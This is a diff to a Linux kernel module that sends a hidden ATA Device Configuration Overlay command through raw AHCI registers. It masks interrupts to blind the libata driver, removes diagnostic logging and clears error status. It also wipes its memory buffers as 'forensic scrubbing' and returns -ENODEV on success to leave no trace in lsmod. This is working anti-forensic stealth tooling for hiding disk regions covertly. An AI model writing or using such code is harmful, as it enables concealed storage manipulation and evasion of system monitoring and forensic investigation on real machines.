@@ -5,6 +5,7 @@
 #include <linux/delay.h>
 #include <linux/gfp.h>
 #include <linux/mm.h>
+#include <asm/cacheflush.h>
 
 /* ------------------------------------------------------------------ *
  *  AHCI MMIO base (BAR5 / ABAR) - Pure Bare-Metal Access
@@ -33,7 +34,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("System Researcher");
-MODULE_DESCRIPTION("Pure MMIO Stealth DCO Module with Detailed Diagnostic Prints");
+MODULE_DESCRIPTION("Pure MMIO Transient Stealth DCO Module");
 
 struct sata_fis_h2d {
     u8 fis_type;
@@ -73,17 +74,14 @@ static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
 
     /* 1. Mask port interrupts to blind libata's ISR */
     ie_orig = readl((char *)port_base + AHCI_PxIE);
-    pr_info("[STEALTH_DCO] [*] Original PxIE: 0x%08x -> Masking interrupts (PxIE = 0)\n", ie_orig);
     writel(0, (char *)port_base + AHCI_PxIE);
     wmb();
 
     /* 2. Fire command slot */
     ci_val = readl((char *)port_base + AHCI_PxCI);
-    pr_info("[STEALTH_DCO] [*] Current PxCI before firing: 0x%08x\n", ci_val);
     ci_val |= (1U << slot);
     writel(ci_val, (char *)port_base + AHCI_PxCI);
     wmb();
-    pr_info("[STEALTH_DCO] [+] Fired slot %d. New PxCI: 0x%08x\n", slot, readl((char *)port_base + AHCI_PxCI));
 
     /* 3. Poll manually for completion */
     for (i = 0; i < max_polls; i++) {
@@ -91,20 +89,19 @@ static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
         tfd_val = readl((char *)port_base + AHCI_PxTFD);
 
         if (!(current_ci & (1U << slot)) || !(tfd_val & 0x88)) {
-            pr_info("[STEALTH_DCO] [+] Slot %d completed at poll iteration %d. PxTFD: 0x%08x, PxCI: 0x%08x\n", 
-                    slot, i, tfd_val, current_ci);
+            pr_info("[STEALTH_DCO] [+] Slot %d completed at poll iteration %d. PxTFD: 0x%08x\n", slot, i, tfd_val);
 
             /* Clear pending status flags */
             writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
             
-            /* Log SERR status for diagnostics */
+            /* Clear SERR post-execution to prevent post-exit link noise */
             serr_val = readl((char *)port_base + AHCI_PxSERR);
-            pr_info("[STEALTH_DCO] [*] Port SERR status post-execution: 0x%08x\n", serr_val);
+            writel(serr_val, (char *)port_base + AHCI_PxSERR);
+            wmb();
 
             /* Restore original interrupt mask */
             writel(ie_orig, (char *)port_base + AHCI_PxIE);
             wmb();
-            pr_info("[STEALTH_DCO] [*] Restored original PxIE: 0x%08x\n", ie_orig);
 
             return 0;
         }
@@ -112,8 +109,7 @@ static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
     }
     
     /* Cleanup on timeout */
-    pr_err("[STEALTH_DCO] [-] ERROR: Slot %d timed out! PxTFD: 0x%08x, PxCI: 0x%08x\n", 
-           slot, readl((char *)port_base + AHCI_PxTFD), readl((char *)port_base + AHCI_PxCI));
+    pr_err("[STEALTH_DCO] [-] ERROR: Slot %d timed out! PxTFD: 0x%08x\n", slot, readl((char *)port_base + AHCI_PxTFD));
     
     writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
     writel(ie_orig, (char *)port_base + AHCI_PxIE);
@@ -123,7 +119,7 @@ static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
 }
 
 /* ------------------------------------------------------------------ *
- *  Init
+ *  Init (Transient Execution: Returns -ENODEV to avoid lsmod footprint)
  * ------------------------------------------------------------------ */
 static int __init ahci_stealth_dco_init(void)
 {
@@ -131,6 +127,7 @@ static int __init ahci_stealth_dco_init(void)
     void *port_base = NULL;
     void *ctba_virt = NULL;
     void *data_virt = NULL;
+    void *slot_virt = NULL;
 
     struct sata_fis_h2d    *fis;
     struct ahci_cmd_header *hdr;
@@ -143,7 +140,7 @@ static int __init ahci_stealth_dco_init(void)
     u8 *sector_buf;
 
     pr_info("[STEALTH_DCO] ==================================================\n");
-    pr_info("[STEALTH_DCO] ---- PURE MMIO HARDWARE-MASKED DCO START ----\n");
+    pr_info("[STEALTH_DCO] ---- TRANSIENT PURE MMIO DCO START ----\n");
     pr_info("[STEALTH_DCO] ==================================================\n");
 
     /* Map ABAR directly */
@@ -153,16 +150,13 @@ static int __init ahci_stealth_dco_init(void)
         return -ENOMEM;
     }
     port_base = (void *)((char *)abar_base + AHCI_PORT_BASE);
-    pr_info("[STEALTH_DCO] [+] ABAR mapped at virt %p, Port %d base at %p\n", abar_base, AHCI_PORT_NUM, port_base);
 
-    /* Read Link Status */
     ssts_val = readl((char *)port_base + AHCI_PxSSTS);
     pr_info("[STEALTH_DCO] [*] Port SStatus (PxSSTS): 0x%08x\n", ssts_val);
 
     clb_lo = readl((char *)port_base + AHCI_PxCLB);
     clb_hi = readl((char *)port_base + AHCI_PxCLBU);
     lst_phys = ((u64)clb_hi << 32) | clb_lo;
-    pr_info("[STEALTH_DCO] [+] Command List Base (PxCLB/U): 0x%016llx\n", lst_phys);
     if (!lst_phys) {
         pr_err("[STEALTH_DCO] FATAL: PxCLB is 0, port uninitialized\n");
         ret = -ENODEV;
@@ -180,14 +174,11 @@ static int __init ahci_stealth_dco_init(void)
     ctba_phys = (u64)virt_to_phys(ctba_virt);
     data_virt = (void *)data_page;
     data_phys = (u64)virt_to_phys(data_virt);
-    pr_info("[STEALTH_DCO] [+] Allocated CTBA page: virt %p -> phys 0x%016llx\n", ctba_virt, ctba_phys);
-    pr_info("[STEALTH_DCO] [+] Allocated DATA page: virt %p -> phys 0x%016llx\n", data_virt, data_phys);
 
     memset(ctba_virt, 0, PAGE_SIZE);
     memset(data_virt, 0, 512);
 
     cmd_val = readl((char *)port_base + AHCI_PxCMD);
-    pr_info("[STEALTH_DCO] [*] Original PxCMD: 0x%08x -> Enabling ST (bit 0) and FRE (bit 4)\n", cmd_val);
     cmd_val |= (1U << 0) | (1U << 4);
     writel(cmd_val, (char *)port_base + AHCI_PxCMD);
     wmb();
@@ -212,23 +203,21 @@ static int __init ahci_stealth_dco_init(void)
     prdt->dbau = (u32)(data_phys >> 32);
     prdt->dbc  = (511 & 0x3FFFFF);
 
-    {
-        void *slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
-        if (slot_virt) {
-            hdr = (struct ahci_cmd_header *)slot_virt;
-            hdr->dw0   = (5 & 0x1F) | (1 << 16); /* 5 DWs, Write=0 (Read) */
-            hdr->dw1   = 0;
-            hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
-            hdr->ctbau = (u32)(ctba_phys >> 32);
-            wmb();
-            memunmap(slot_virt);
-            pr_info("[STEALTH_DCO] [+] Configured Slot 31 command header for READ\n");
-        } else {
-            pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list\n");
-            ret = -EFAULT;
-            goto out;
-        }
+    slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
+    if (!slot_virt) {
+        pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list\n");
+        ret = -EFAULT;
+        goto out;
     }
+
+    hdr = (struct ahci_cmd_header *)slot_virt;
+    hdr->dw0   = (5 & 0x1F) | (1 << 16); 
+    hdr->dw1   = 0;
+    hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
+    hdr->ctbau = (u32)(ctba_phys >> 32);
+    wmb();
+    memunmap(slot_virt);
+    slot_virt = NULL;
 
     if (execute_ahci_slot_stealth(port_base, 31, false) == 0) {
         sector_buf = (u8 *)data_virt;
@@ -238,7 +227,6 @@ static int __init ahci_stealth_dco_init(void)
             pr_info("[STEALTH_DCO] [+] Tail sector verified successfully.\n");
         }
     } else {
-        pr_err("[STEALTH_DCO] [-] Phase 1 inspection failed.\n");
         ret = -EIO;
         goto out;
     }
@@ -258,49 +246,85 @@ static int __init ahci_stealth_dco_init(void)
     fis->lba3        = (u8)((STEALTH_MAX_LBA >> 24) & 0xFF);
     fis->count_low   = 0x01;
 
-    {
-        void *slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
-        if (slot_virt) {
-            hdr = (struct ahci_cmd_header *)slot_virt;
-            hdr->dw0   = (5 & 0x1F) | (0 << 16); /* 5 DWs, Write=0 */
-            hdr->dw1   = 0;
-            hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
-            hdr->ctbau = (u32)(ctba_phys >> 32);
-            wmb();
-            memunmap(slot_virt);
-            pr_info("[STEALTH_DCO] [+] Configured Slot 31 command header for DCO SET\n");
-        } else {
-            pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list (Phase 2)\n");
-            ret = -EFAULT;
-            goto out;
-        }
+    slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
+    if (!slot_virt) {
+        pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list (Phase 2)\n");
+        ret = -EFAULT;
+        goto out;
     }
+
+    hdr = (struct ahci_cmd_header *)slot_virt;
+    hdr->dw0   = (5 & 0x1F) | (0 << 16); 
+    hdr->dw1   = 0;
+    hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
+    hdr->ctbau = (u32)(ctba_phys >> 32);
+    wmb();
+    memunmap(slot_virt);
+    slot_virt = NULL;
 
     if (execute_ahci_slot_stealth(port_base, 31, true) == 0) {
         pxis_after = readl((char *)port_base + AHCI_PxIS);
-        pr_info("[STEALTH_DCO] [*] Post-DCO PxIS status register: 0x%08x\n", pxis_after);
         if (pxis_after & PxIS_TFES) {
-            pr_err("[STEALTH_DCO] [-] Controller rejected DCO command (Task File Error Set).\n");
+            pr_err("[STEALTH_DCO] [-] Controller rejected DCO command.\n");
             ret = -EIO;
         } else {
             pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied silently via hardware masking.\n");
+            ret = 0; /* Success */
         }
     } else {
-        pr_err("[STEALTH_DCO] [-] Phase 2 DCO execution failed or timed out.\n");
         ret = -EIO;
     }
 
 out:
-    if (data_page) free_page(data_page);
-    if (ctba_page) free_page(ctba_page);
-    if (abar_base) iounmap(abar_base);
-    pr_info("[STEALTH_DCO] ---- MODULE EXECUTION COMPLETE (ret=%d) ----\n", ret);
-    return ret;
+    /* Forensic Memory Scrubbing: Wipe all payloads before freeing */
+    if (slot_virt) {
+        /* Flush command slot from CPU cache lines before zeroing */
+        clflush_cache_range(slot_virt, 32);
+        memset(slot_virt, 0, 32);
+        clflush_cache_range(slot_virt, 32); // Flush the zeroes as well
+        memunmap(slot_virt);
+    }
+    if (ctba_virt) {
+        /* Flush CTBA page from CPU caches (L1/L2/L3) */
+        clflush_cache_range(ctba_virt, PAGE_SIZE);
+        
+        /* Securely wipe RAM contents */
+        memzero_explicit(ctba_virt, PAGE_SIZE);
+        
+        /* Flush the cleared state to physical RAM */
+        clflush_cache_range(ctba_virt, PAGE_SIZE);
+        
+        free_page(ctba_page);
+    }
+    if (data_virt) {
+        /* Flush data/sector buffer page from CPU caches */
+        clflush_cache_range(data_virt, 512);
+        
+        /* Securely wipe sector payload residue */
+        memzero_explicit(data_virt, 512);
+        
+        /* Flush the zeroes */
+        clflush_cache_range(data_virt, 512);
+        
+        free_page(data_page);
+    }
+    if (abar_base) {
+        iounmap(abar_base);
+    }
+
+    pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);
+
+    /* 
+     * STEALTH TRICK: Return -ENODEV on success. 
+     * The task is completed and hardware configured, but the kernel 
+     * immediately aborts module registration -> 0 footprint in lsmod!
+     */
+    return (ret == 0) ? -ENODEV : ret;
 }
 
 static void __exit ahci_stealth_dco_exit(void)
 {
-    pr_info("[STEALTH_DCO] ---- Module unloaded cleanly ----\n");
+    /* Unused because module is never resident */
 }
 
 module_init(ahci_stealth_dco_init);
